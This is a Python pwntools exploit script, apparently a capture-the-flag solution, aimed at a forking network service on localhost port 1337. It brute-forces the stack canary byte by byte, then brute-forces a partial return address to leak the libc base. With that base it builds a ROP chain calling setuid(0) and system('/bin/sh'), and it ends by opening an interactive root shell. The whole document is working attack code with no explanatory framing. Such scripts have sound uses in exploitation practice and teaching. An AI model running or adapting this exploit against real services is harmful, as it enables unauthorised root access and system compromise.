#!/bin/python

from pwn import * 
import time
import sys

BUFFER_LEN  = 0x40-8
LIBC_PRINT_VERSION = 0x24180

CANARY_MSG=b"*** stack smashing detected ***: terminated"
LIBC_PRINT=b"GNU C Library"

context.arch = 'amd64'
context.log_level = 'info'
context.log_level = 'error'


def increment_byte(byte: int):
    if byte >= 255:
        print(f"byte out of byte range.")
        return 0
    else:
        return byte+1


def brute_force_qword(qword=None, pad=b'', until=b'', reverse=False, start=0):
    if qword is None:
        qword = bytearray(8)

    for i in range(start, len(qword)):
        while True:
            proc = remote('localhost', 1337)
            proc.send(pad + bytes(qword[:i+1]))
            try:
                if proc.recvuntil(until, timeout=1) != '':
                    if reverse:
                        break
                    else:
                        qword[i] = increment_byte(qword[i])
            except EOFError as _:
                if reverse:
                    qword[i] = increment_byte(qword[i])
                else:
                    break

    return qword


#server = process(sys.argv[1])
#elf = server.elf
elf  = ELF(sys.argv[1])
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # elf.libc not working

canary = brute_force_qword(pad=b'X' * BUFFER_LEN, until=CANARY_MSG)
print(f"[$] Canary: {canary.hex()}")

padding = b'X' * BUFFER_LEN + canary + b'Y' * 8
libc_print_addr = bytearray(8)
libc_print_addr[0] =   LIBC_PRINT_VERSION & 0x000FF
libc_print_addr[1] = ((LIBC_PRINT_VERSION // 16 ** 2) & 0x00F)
libc_print_addr = brute_force_qword(libc_print_addr, padding, LIBC_PRINT, True,start=1)
print(f"[$] libc print: {hex(u64(libc_print_addr))}")


libc.address = u64(libc_print_addr) - LIBC_PRINT_VERSION
print("[$] libc address: " + hex(libc.address))

rop = ROP(libc)
rop.setuid(0)
#rop.raw(rop.ret)
rop.system( next(libc.search(b'/bin/sh')) )
print("\n" + rop.dump())
proc = remote('localhost', 1337)
proc.send(padding + rop.chain())

proc.interactive()
